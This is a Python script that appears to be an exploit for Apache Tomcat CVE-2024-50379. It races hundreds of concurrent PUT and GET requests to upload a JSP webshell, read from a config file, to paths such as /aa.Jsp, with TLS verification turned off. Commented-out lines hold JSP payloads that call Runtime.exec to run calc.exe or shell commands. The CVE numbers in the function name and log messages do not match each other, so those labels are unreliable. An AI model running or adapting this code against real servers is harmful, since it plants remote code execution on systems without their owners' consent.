import concurrent.futures
import logging
import ssl
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style

import requests
import urllib3

ssl._create_default_https_context = ssl._create_unverified_context
# 忽略HTTPS请求中的不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置日志格式，输出INFO级别及以上的日志消息
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()


def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def check_cve_2024_50739(url, config):
    protocols = ['http://', 'https://']
    found_vulnerabilities = False

    for protocol in protocols:
        target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
        logging.info(f"{Fore.GREEN}[+] 检查 {target_url}...")

        target_url_put1 = urljoin(target_url, "/aa.Jsp")
        target_url_put2 = urljoin(target_url, "/bb.Jsp")
        target_url_get1 = urljoin(target_url, "/aa.jsp")
        target_url_get2 = urljoin(target_url, "/bb.Jsp")

        headers1 = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Content-Type": "application/json"
        }

        headers2 = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
        }
        # payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"
        # Process process = Runtime.getRuntime().exec(new String[]{" /bin/sh -c ls /usr/local"});
        # payload_put = "aa<% Runtime.getRuntime().exec(\"bin/sh -c ls -al /usr \");%>"
        # 从配置字典中获取名为 'shell_file_content' 的文件内容
        # 如果该键不存在，则使用默认的 shell 内容作为后备值
        shell_file_content = config['files'].get('shell_file_content', '<%-- 默认的 shell 内容 --%>')

        # 将获取到的shell文件内容赋值给变量 payload_put，以便后续使用
        payload_put = shell_file_content


        # 增加线程
        # 使用ThreadPoolExecutor来并发执行多个请求
        with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
            futures = []
            # 循环执行100次
            for _ in range(100):
                # 发起PUT请求，并将future对象存储在futures列表中
                futures.append(
                    executor.submit(requests.put, target_url_put1, verify=False, headers=headers1, data=payload_put))
                futures.append(
                    executor.submit(requests.put, target_url_put2, verify=False, headers=headers1, data=payload_put))
                # 发起GET请求，并将future对象存储在futures列表中
                futures.append(executor.submit(requests.get, target_url_get1, verify=False, headers=headers2))
                futures.append(executor.submit(requests.get, target_url_get2, verify=False, headers=headers2))


            # 使用concurrent.futures.as_completed函数监控futures集合中的所有future对象完成情况
            # 遍历并发执行的future对象
            for future in concurrent.futures.as_completed(futures):
                try:
                    # 获取future对象的结果
                    response = future.result()
                    # 检查response是否为requests.Response实例
                    if isinstance(response, requests.Response):
                        # 检查HTTP状态码是否表示请求成功
                        if response.status_code in [200, 201]:
                            # 成功时记录日志并返回True表示漏洞存在
                            logger.info(
                                f"{Fore.GREEN}[+] 成功: Apache Tomcat CVE-2024-50379  漏洞利用方式:{target_url}aa.Jsp OR {target_url}bb.Jsp")
                            return True, "CVE-2024-50379", None
                except requests.exceptions.RequestException as req_ex:
                    # 捕获请求异常并记录日志
                    logger.warning(f"{Fore.RED}[-] 请求失败: {req_ex}")
                except Exception as e:
                    # 捕获未知异常并记录日志
                    logger.error(f"{Fore.RED}[-] 发生未知错误: {e}")
                    # 记录漏洞检测失败信息
                    logger.warning(f"{Fore.RED}[-] 失败: CVE-2017-12615 漏洞 Not Found")

            return False, None, None

